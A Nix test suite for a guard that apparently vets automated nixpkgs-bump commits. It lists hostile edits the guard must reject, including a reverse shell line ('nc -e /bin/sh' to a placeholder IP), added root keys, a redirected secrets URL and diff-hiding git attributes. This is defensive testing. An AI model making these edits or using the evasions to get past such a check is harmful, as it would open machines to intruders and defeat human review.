# ./guard.sh against a scratch repository, without network: `curl` and
# `nix` are stubs (built into the guard tested here in place of the real
# ones) that answer GitHub's compare and `nix flake prefetch` from files
# under $STUB. Each case starts from main@origin, makes one change, and
# expects the guard to pass or to fail. Cases run online (against the
# stubs; a pass is exit 0 and a last line PASS) or with --offline (a pass
# there is exit 3 and a last line PASS-OFFLINE, never PASS).
{ pkgs }:
let
  # GitHub's compare API: $STUB/compare/<base>...<head> holds the status;
  # none means unreachable (curl -f fails).
  curl = pkgs.writeShellApplication {
    name = "curl";
    runtimeInputs = [ pkgs.coreutils ];
    text = ''
      url=''${*: -1}
      case "$url" in
        https://api.github.com/repos/NixOS/nixpkgs/compare/*)
          spec=''${url#https://api.github.com/repos/NixOS/nixpkgs/compare/}
          spec=''${spec%%\?*}
          [ -r "$STUB/compare/$spec" ] || { echo "curl stub: unreachable $spec" >&2; exit 7; }
          printf '{"status": "%s"}\n' "$(cat "$STUB/compare/$spec")"
          ;;
        *) echo "curl stub: unexpected $*" >&2; exit 2 ;;
      esac
    '';
  };
  # `nix flake prefetch --json github:NixOS/nixpkgs/<rev>`: $STUB/prefetch/<rev>.
  nix = pkgs.writeShellApplication {
    name = "nix";
    runtimeInputs = [ pkgs.coreutils ];
    text = ''
      if [ "$#" = 4 ] && [ "$1 $2 $3" = "flake prefetch --json" ]; then
        rev=''${4#github:NixOS/nixpkgs/}
        [ -r "$STUB/prefetch/$rev" ] || { echo "nix stub: cannot fetch $4" >&2; exit 1; }
        cat "$STUB/prefetch/$rev"
        exit 0
      fi
      echo "nix stub: unexpected $*" >&2
      exit 2
    '';
  };
  guard = import ./guard.nix {
    inherit pkgs nix curl;
  };
in
pkgs.runCommand "nixpkgs-bump-guard-test"
  {
    nativeBuildInputs = [
      guard
      pkgs.git
      pkgs.jujutsu
      pkgs.jq
    ];
  }
  ''
    set -euo pipefail
    export HOME=$TMPDIR/home JJ_USER=test JJ_EMAIL=test@example.org
    export STUB=$TMPDIR/stub
    mkdir -p $HOME
    git config --global user.name test
    git config --global user.email test@example.org
    git config --global init.defaultBranch main

    old=1111111111111111111111111111111111111111
    new=2222222222222222222222222222222222222222
    hash="sha256-$(printf 'A%.0s' {1..43})="
    lock() { # rev lastModified ref
      jq -n --arg rev "$1" --argjson mod "$2" --arg ref "$3" --arg hash "$hash" '{
        nodes: {
          root: {inputs: {nixpkgs: "nixpkgs_4", disko: "disko"}},
          nixpkgs_4: {
            locked: {lastModified: $mod, narHash: $hash,
              owner: "NixOS", repo: "nixpkgs", rev: $rev, type: "github"},
            original: {owner: "NixOS", ref: $ref, repo: "nixpkgs", type: "github"}},
          disko: {
            locked: {lastModified: 1, narHash: "sha256-\("B" * 43)=",
              owner: "nix-community", repo: "disko", rev: "\("3" * 40)", type: "github"},
            original: {owner: "nix-community", repo: "disko", type: "github"}}},
        root: "root", version: 7}'
    }
    # the network as it should be: $new is nixpkgs-unstable's tip, ahead
    # of $old, and prefetches to the lock's narHash
    stub_good() {
      rm -rf "$STUB"
      mkdir -p "$STUB/compare" "$STUB/prefetch"
      echo identical >"$STUB/compare/$new...nixpkgs-unstable"
      echo ahead >"$STUB/compare/$old...$new"
      jq -n --arg hash "$hash" '{hash: $hash, locked: {lastModified: 200}}' >"$STUB/prefetch/$new"
    }
    stub_good

    git init -q --bare origin.git
    git init -q seed
    (
      cd seed
      lock $old 100 nixpkgs-unstable >flake.lock
      mkdir -p vars/shared machines/x modules/nixos/infra-space
      echo secret >vars/shared/value
      printf '{ pkgs, ... }:\n{\n  services.foo.enable = true;\n  services.foo.extraConfig = "x = 1";\n}\n' >machines/x/default.nix
      echo '{ }' >modules/nixos/infra-space/default.nix
      # root on every machine (nixosConfigurations.nix), and a machine
      # whose multi-line lists take a new item without naming an option
      printf '{\n  dave = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIdave";\n}\n' >modules/admin-ssh-keys.nix
      mkdir -p machines/y modules/nixos/luks
      printf '%s\n' '{ ... }:' '{' \
        '  users.users.root.openssh.authorizedKeys.keys = [' \
        '    "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIold"' \
        '  ];' \
        '  networking.firewall.allowedTCPPorts = [' \
        '    80' \
        '  ];' \
        '}' >machines/y/default.nix
      printf '#!/bin/sh\necho unlock\n' >modules/nixos/luks/agent.sh
      # every machine's copy of the secrets store, pulled from this URL
      printf '%s\n' '{ lib, ... }:' '{' \
        '  options.clanSecretsMirror.url = lib.mkOption {' \
        '    default = "git@github.com:DavHau/hyperconfig-secrets.git";' \
        '  };' \
        '}' >modules/nixos/clan-secrets-mirror.nix
      git add -A
      git commit -qm init
      git push -q ../origin.git main
    )
    ws=$PWD/hyperconfig-nixpkgs-bump-2026-01-01
    jj git clone --colocate origin.git "$ws" >/dev/null 2>&1
    echo $old >start.rev
    cd "$ws"

    mode=offline
    guard() {
      if [ "$mode" = offline ]; then
        nixpkgs-bump-guard --offline --old-rev-file "$TMPDIR/start.rev"
      else
        nixpkgs-bump-guard --old-rev-file "$TMPDIR/start.rev"
      fi
    }
    run() { # expect(pass|fail) description why(the FAIL line's pattern) edit
      local expect=$1 what=$2 why=$3 rc=0 last want_rc=0 want_last="nixpkgs-bump-guard: PASS"
      shift 3
      jj new main@origin >/dev/null 2>&1
      "$@"
      jj describe -m "$what" >/dev/null 2>&1
      guard >"$TMPDIR/out" 2>&1 || rc=$?
      last=$(tail -n 1 "$TMPDIR/out")
      if [ "$mode" = offline ]; then
        want_rc=3 want_last="nixpkgs-bump-guard: PASS-OFFLINE (not a push permit)"
      fi
      if [ "$rc" = "$want_rc" ] && [ "$last" = "$want_last" ]; then
        got=pass
      elif [ "$rc" = 1 ] && ! grep -q 'PASS' "$TMPDIR/out"; then
        got=fail
      else
        got="exit $rc, last line '$last'"
      fi
      if [ "$got" != "$expect" ] || { [ "$got" = fail ] && ! grep -q "FAIL: .*$why" "$TMPDIR/out"; }; then
        cat "$TMPDIR/out"
        echo "FAILED: $what ($mode): expected $expect ($why), got $got"
        exit 1
      fi
      echo "ok: $what ($mode, $got)"
    }

    bump() { lock $new 200 nixpkgs-unstable >flake.lock; }
    lock_with() { lock $new 200 nixpkgs-unstable | jq "$1" >flake.lock; }
    fix() { bump; printf '%s\n' "$@" >machines/x/fix.nix; }
    # a renamed option adapted (extraConfig -> settings): nothing denied
    machine_fix() {
      bump
      printf '{ pkgs, ... }:\n{\n  services.foo.enable = true;\n  services.foo.settings.x = 1;\n}\n' >machines/x/default.nix
    }
    secret() { bump; echo y >vars/shared/value; }
    own_module() { bump; echo '{ x = 1; }' >modules/nixos/infra-space/default.nix; }
    flake_nix() { bump; echo '{ }' >flake.nix; }
    substituter() { fix '{ nix.settings.substituters = [ "https://x" ]; }'; }
    authorized_key() { fix '{ users.users.root.openssh.authorizedKeys.keys = [ "k" ]; }'; }
    fetch() { fix '{ p = fetchpatch { url = "https://x"; }; }'; }
    other_input() { lock_with '.nodes.disko.locked.rev = "4444444444444444444444444444444444444444"'; }
    new_node() { lock_with '.nodes.evil = {}'; }
    other_branch() { lock $new 200 nixos-unstable-small >flake.lock; }
    other_owner() { lock_with '.nodes.nixpkgs_4.locked.owner = "evil"'; }
    backwards() { lock $new 50 nixpkgs-unstable >flake.lock; }
    # F1: diffs that git would show as binary or through a driver
    attributes_in_tree() {
      fix '{ security.sudo.wheelNeedsPassword = false; }'
      printf '*.nix -diff\nfix.nix binary\n' >.gitattributes
    }
    attributes_in_repo() {
      fix '{ security.sudo.wheelNeedsPassword = false; }'
      mkdir -p .git/info
      echo '*.nix diff=hide' >.git/info/attributes
      git config diff.hide.textconv 'sed d'
      git config diff.hide.command true
      git config diff.external true
    }
    attributes_cleanup() {
      rm -f .git/info/attributes
      git config --unset diff.hide.textconv
      git config --unset diff.hide.command
      git config --unset diff.external
    }
    # F2: names git would quote, symlinks
    quoted_secret() { bump; printf 's\n' >"vars/shared/é"; }
    upper_secret() { bump; mkdir -p Vars; echo s >Vars/x; }
    tab_name() { bump; echo '{ }' >"machines/x/a$(printf '\t')b.nix"; }
    symlink() { bump; ln -s ../../vars/shared/value machines/x/value; }
    # F3: nested attribute sets, units, fetches the old list missed
    nested_users() { fix '{' '  users = {' '    users.eve.isNormalUser = true;' '  };' '}'; }
    nested_vars() { fix '{' '  clan.core = {' '    vars.generators.x = { };' '  };' '}'; }
    exec_start() { fix '{' '  systemd.services.x.serviceConfig.ExecStart = "/bin/sh";' '}'; }
    unit_script() { fix '{ x.script = "id"; }'; }
    firewall() { fix '{ networking.firewall.enable = false; }'; }
    known_hosts() { fix '{ programs.ssh.knownHosts.x.publicKey = "k"; }'; }
    require_file() { fix '{ p = requireFile { name = "x"; sha256 = ""; }; }'; }
    output_hash() { fix '{ p = pkgs.runCommand "x" { outputHash = ""; } "true"; }'; }
    dynamic_builtin() { fix '{ p = builtins.''${"fe" + "tchurl"} "x"; }'; }
    url() { fix '{ p = pkgs.foo.override { src = "http://example.org/x"; }; }'; }
    allow_env() { fix '# NIXPKGS_ALLOW_INSECURE=1'; }
    envrc() { bump; echo 'use flake' >.envrc; }
    flake_parts() { bump; mkdir -p modules/flake-parts; echo '{ }' >modules/flake-parts/x.nix; }
    nested_lock() { bump; mkdir -p tools/x; echo '{ }' >machines/x/flake.lock; }
    fake_header() { fix '{' '++ b/machines/x/fix.nix' '-- a/security' '}'; }
    # third review: admin keys, items in multi-line lists, non-Nix files,
    # attribute names computed from strings
    admin_key() {
      bump
      printf '{\n  dave = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIdave";\n  x = "k";\n}\n' >modules/admin-ssh-keys.nix
    }
    list_key() {
      bump
      sed -i 's/^    "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIold"$/&\n    "ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTY="/' machines/y/default.nix
    }
    list_port() { bump; sed -i 's/^    80$/&\n    2222/' machines/y/default.nix; }
    root_script() { bump; echo 'nc -e /bin/sh 203.0.113.1 4444' >>modules/nixos/luks/agent.sh; }
    json_file() { bump; echo '{ "x": 1 }' >machines/x/data.json; }
    # fourth review: the secrets mirror's URL names no denied option
    mirror_url() { bump; sed -i 's|DavHau/hyperconfig-secrets|eve/x|' modules/nixos/clan-secrets-mirror.nix; }
    dynamic_attr() { fix '{ ''${"user" + "s"}.''${"user"+"s"}.eve.isNormalUser = true; }'; }
    interpolated_attr() { fix '{ "''${"secur"}ity"."''${"su"}do".wheelNeedsPassword = false; }'; }

    run pass "the bump alone" "" bump
    run pass "the bump and a fix to a machine (a renamed option)" "" machine_fix
    run fail "nothing changed" "empty or undescribed" true
    run fail "a secret too" "denied paths" secret
    run fail "the agent's own module" "denied paths" own_module
    run fail "flake.nix" "denied paths" flake_nix
    run fail "a substituter" "denied options" substituter
    run fail "an authorized key" "denied options" authorized_key
    run fail "a new fetch" "denied options" fetch
    run fail "another input moved" "more than nixpkgs" other_input
    run fail "a new node" "more than nixpkgs" new_node
    run fail "another branch" "original is not" other_branch
    run fail "another owner" "not a plain" other_owner
    run fail "lastModified backwards" "backwards" backwards
    run fail "in-tree .gitattributes -diff hides a denied option" "denied options" attributes_in_tree
    run fail "in-tree .gitattributes itself" "denied paths" attributes_in_tree
    run fail "repo attributes, textconv, diff.external hide a denied option" "denied options" attributes_in_repo
    attributes_cleanup
    run fail "a non-ASCII name under vars/" "denied paths" quoted_secret
    run fail "Vars/ in another case" "denied paths" upper_secret
    run fail "a tab in a name" "odd name" tab_name
    run fail "a symlink" "symlink" symlink
    run fail "users in a nested attribute set" "denied options" nested_users
    run fail "clan vars in a nested attribute set" "denied options" nested_vars
    run fail "a systemd ExecStart" "denied options" exec_start
    run fail "a unit script" "denied options" unit_script
    run fail "the firewall" "denied options" firewall
    run fail "ssh known hosts" "denied options" known_hosts
    run fail "requireFile" "denied options" require_file
    run fail "a fixed-output derivation" "denied options" output_hash
    run fail "a computed builtins attribute" "denied options" dynamic_builtin
    run fail "a URL" "denied options" url
    run fail "NIXPKGS_ALLOW_*" "denied options" allow_env
    run fail ".envrc" "denied paths" envrc
    run fail "modules/flake-parts/" "denied paths" flake_parts
    run fail "a nested flake.lock" "denied paths" nested_lock
    run fail "content that looks like a diff header" "denied options" fake_header
    run fail "modules/admin-ssh-keys.nix" "denied paths" admin_key
    run fail "an ecdsa key in a multi-line authorizedKeys list" "denied options" list_key
    run fail "a port in a multi-line allowedTCPPorts list" "denied options" list_port
    run fail "a root-run shell script" "only .nix files" root_script
    run fail "a JSON file" "only .nix files" json_file
    run fail "a dynamic attribute name" "denied options" dynamic_attr
    run fail "an interpolated attribute name" "denied options" interpolated_attr
    run fail "the secrets mirror's repository URL" "denied paths" mirror_url

    # someone else bumped since the run started
    echo 9999999999999999999999999999999999999999 >"$TMPDIR/start.rev"
    run fail "main@origin moved nixpkgs since the start" "someone else bumped" bump
    echo $old >"$TMPDIR/start.rev"

    # (ii) against the stubs: GitHub's compare and the prefetch
    mode=online
    run pass "the bump, the tip of nixpkgs-unstable" "" bump
    echo ahead >"$STUB/compare/$new...nixpkgs-unstable"
    run pass "the bump, behind the tip (the channel moved on)" "" bump
    run pass "a fix, online" "" machine_fix
    echo diverged >"$STUB/compare/$new...nixpkgs-unstable"
    run fail "a rev off nixpkgs-unstable (a fork's)" "not on nixpkgs-unstable (compare: diverged)" bump
    echo behind >"$STUB/compare/$new...nixpkgs-unstable"
    run fail "a rev past nixpkgs-unstable" "not on nixpkgs-unstable (compare: behind)" bump
    rm "$STUB/compare/$new...nixpkgs-unstable"
    run fail "GitHub unreachable" "not on nixpkgs-unstable (compare: unreachable)" bump
    stub_good
    echo diverged >"$STUB/compare/$old...$new"
    run fail "a rev that does not descend from the old one" "does not descend" bump
    stub_good
    jq '.hash = "sha256-\("C" * 43)="' "$STUB/prefetch/$new" >"$TMPDIR/p" && mv "$TMPDIR/p" "$STUB/prefetch/$new"
    run fail "a narHash that is not the prefetched one" "narHash is not the prefetched" bump
    stub_good
    jq '.locked.lastModified = 300' "$STUB/prefetch/$new" >"$TMPDIR/p" && mv "$TMPDIR/p" "$STUB/prefetch/$new"
    run fail "a lastModified that is not the prefetched one" "lastModified is not the prefetched" bump
    rm "$STUB/prefetch/$new"
    run fail "the prefetch fails" "prefetch .* failed" bump
    stub_good
    run fail "denied paths online too" "denied paths" secret
    mode=offline

    # not the bump workspace
    jj new main@origin >/dev/null 2>&1
    lock $new 200 nixpkgs-unstable >flake.lock
    jj describe -m bump >/dev/null 2>&1
    mkdir sub
    if (cd sub && nixpkgs-bump-guard --offline --old-rev-file "$TMPDIR/start.rev") >/dev/null 2>&1; then
      echo "FAILED: ran from a subdirectory"
      exit 1
    fi
    echo "ok: refuses a subdirectory"
    rmdir sub
    cp -r "$ws" "$TMPDIR/hyperconfig"
    if (cd "$TMPDIR/hyperconfig" && nixpkgs-bump-guard --offline --old-rev-file "$TMPDIR/start.rev") >/dev/null 2>&1; then
      echo "FAILED: ran in a checkout that is not a bump workspace"
      exit 1
    fi
    echo "ok: refuses the main checkout"
    # an empty working-copy commit on top of the bump
    jj new >/dev/null 2>&1
    if nixpkgs-bump-guard --offline --old-rev-file "$TMPDIR/start.rev" >"$TMPDIR/out" 2>&1 ||
      ! grep -q "FAIL: .*empty or undescribed" "$TMPDIR/out"; then
      cat "$TMPDIR/out"
      echo "FAILED: pushed an empty commit"
      exit 1
    fi
    echo "ok: refuses an empty commit on top"
    touch $out
  ''
